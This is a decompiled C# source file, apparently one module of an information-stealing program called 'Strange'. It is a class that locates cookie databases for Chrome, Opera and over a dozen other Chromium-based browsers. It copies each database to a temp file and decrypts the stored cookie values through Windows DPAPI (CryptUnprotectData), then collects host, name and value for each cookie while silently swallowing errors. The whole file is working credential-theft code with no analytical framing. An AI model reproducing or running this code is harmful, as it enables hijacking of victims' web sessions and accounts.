using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Strange.Additions;
using Strange.String;

namespace Strange.Main_Features
{
	// Token: 0x02000019 RID: 25
	internal class Cookies
	{
		// Token: 0x06000033 RID: 51 RVA: 0x000042B8 File Offset: 0x000024B8
		public static List<CookieData> GetCookies()
		{
			List<CookieData> list = new List<CookieData>();
			string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
			string[] array = new string[]
			{
				environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Cookies",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Cookies",
				environmentVariable + "\\Kometa\\User Data\\Default\\Cookies",
				environmentVariable + "\\Orbitum Browser\\User Data\\Default\\Cookies",
				environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Cookies",
				environmentVariable + "\\Amigo\\User\\User Data\\Default\\Cookies",
				environmentVariable + "\\Torch\\User Data\\Default\\Cookies",
				environmentVariable + "\\BlackHawk\\User Data\\Default\\Cookies",
				environmentVariable + "\\Uran\\User Data\\Default\\Cookies",
				environmentVariable + "\\AcWebBrowser\\User Data\\Default\\Cookies",
				environmentVariable + "\\CoolNovo\\User Data\\Default\\Cookies",
				environmentVariable + "\\Epic Browser\\User Data\\Default\\Cookies",
				environmentVariable + "\\Baidu Spark\\User Data\\Default\\Cookies",
				environmentVariable + "\\Rockmelt\\User Data\\Default\\Cookies",
				environmentVariable + "\\Sleipnir\\User Data\\Default\\Cookies",
				environmentVariable + "\\SRWare Iron\\User Data\\Default\\Cookies",
				environmentVariable + "\\Titan Browser\\User Data\\Default\\Cookies",
				environmentVariable + "\\Flock\\User Data\\Default\\Cookies"
			};
			foreach (string basePath in array)
			{
				List<CookieData> list2 = Cookies.FetchCookies(basePath);
				if (list2 != null)
				{
					list.AddRange(list2);
				}
			}
			return list;
		}

		// Token: 0x06000034 RID: 52
		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref Cookies.DataBlob pCipherText, ref string pszDescription, ref Cookies.DataBlob pEntropy, IntPtr pReserved, ref Cookies.CryptprotectPromptstruct pPrompt, int dwFlags, ref Cookies.DataBlob pPlainText);

		// Token: 0x06000035 RID: 53 RVA: 0x00004438 File Offset: 0x00002638
		public static byte[] DecryptBrowsers(byte[] cipherTextBytes, byte[] entropyBytes = null)
		{
			Cookies.DataBlob dataBlob = default(Cookies.DataBlob);
			Cookies.DataBlob dataBlob2 = default(Cookies.DataBlob);
			Cookies.DataBlob dataBlob3 = default(Cookies.DataBlob);
			Cookies.CryptprotectPromptstruct cryptprotectPromptstruct = new Cookies.CryptprotectPromptstruct
			{
				cbSize = Marshal.SizeOf(typeof(Cookies.CryptprotectPromptstruct)),
				dwPromptFlags = 0,
				hwndApp = IntPtr.Zero,
				szPrompt = null
			};
			string empty = string.Empty;
			try
			{
				try
				{
					if (cipherTextBytes == null)
					{
						cipherTextBytes = new byte[0];
					}
					dataBlob2.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
					dataBlob2.cbData = cipherTextBytes.Length;
					Marshal.Copy(cipherTextBytes, 0, dataBlob2.pbData, cipherTextBytes.Length);
				}
				catch (Exception)
				{
				}
				try
				{
					if (entropyBytes == null)
					{
						entropyBytes = new byte[0];
					}
					dataBlob3.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
					dataBlob3.cbData = entropyBytes.Length;
					Marshal.Copy(entropyBytes, 0, dataBlob3.pbData, entropyBytes.Length);
				}
				catch (Exception)
				{
				}
				Cookies.CryptUnprotectData(ref dataBlob2, ref empty, ref dataBlob3, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref dataBlob);
				byte[] array = new byte[dataBlob.cbData];
				Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData);
				return array;
			}
			catch (Exception)
			{
			}
			finally
			{
				if (dataBlob.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob.pbData);
				}
				if (dataBlob2.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob2.pbData);
				}
				if (dataBlob3.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob3.pbData);
				}
			}
			return new byte[0];
		}

		// Token: 0x06000036 RID: 54 RVA: 0x000045FC File Offset: 0x000027FC
		private static List<CookieData> FetchCookies(string basePath)
		{
			List<CookieData> result;
			if (!File.Exists(basePath))
			{
				result = null;
			}
			else
			{
				basePath.Contains("Chrome");
				basePath.Contains("Orbitum");
				basePath.Contains("Opera");
				basePath.Contains("Amigo");
				basePath.Contains("Torch");
				basePath.Contains("Comodo");
				basePath.Contains("BlackHawk");
				basePath.Contains("AcWebBrowser");
				basePath.Contains("Baidu Spark");
				basePath.Contains("Rockmelt");
				basePath.Contains("Sleipnir");
				basePath.Contains("SRWare Iron");
				basePath.Contains("Titan Browser");
				basePath.Contains("Flock");
				basePath.Contains("CoolNovo");
				basePath.Contains("Epic Browser");
				basePath.Contains("Uran");
				try
				{
					string text = Path.GetTempPath() + "/" + NameR.GetName() + ".fv";
					if (File.Exists(text))
					{
						File.Delete(text);
					}
					File.Copy(basePath, text, true);
					Decod decod = new Decod(text);
					List<CookieData> list = new List<CookieData>();
					decod.ReadTable("cookies");
					for (int i = 0; i < decod.GetRowCount(); i++)
					{
						try
						{
							string text2 = string.Empty;
							try
							{
								text2 = Encoding.UTF8.GetString(Cookies.DecryptBrowsers(Encoding.Default.GetBytes(decod.GetValue(i, 12)), null));
							}
							catch (Exception)
							{
							}
							if (text2 != "")
							{
								list.Add(new CookieData
								{
									host_key = decod.GetValue(i, 1),
									name = decod.GetValue(i, 2),
									path = decod.GetValue(i, 4),
									expires_utc = decod.GetValue(i, 5),
									secure = decod.GetValue(i, 6),
									value = text2
								});
							}
						}
						catch (Exception)
						{
						}
					}
					File.Delete(text);
					result = list;
				}
				catch (Exception)
				{
					result = null;
				}
			}
			return result;
		}

		// Token: 0x0200001A RID: 26
		private struct CryptprotectPromptstruct
		{
			// Token: 0x04000020 RID: 32
			public int cbSize;

			// Token: 0x04000021 RID: 33
			public int dwPromptFlags;

			// Token: 0x04000022 RID: 34
			public IntPtr hwndApp;

			// Token: 0x04000023 RID: 35
			public string szPrompt;
		}

		// Token: 0x0200001B RID: 27
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct DataBlob
		{
			// Token: 0x04000024 RID: 36
			public int cbData;

			// Token: 0x04000025 RID: 37
			public IntPtr pbData;
		}
	}
}
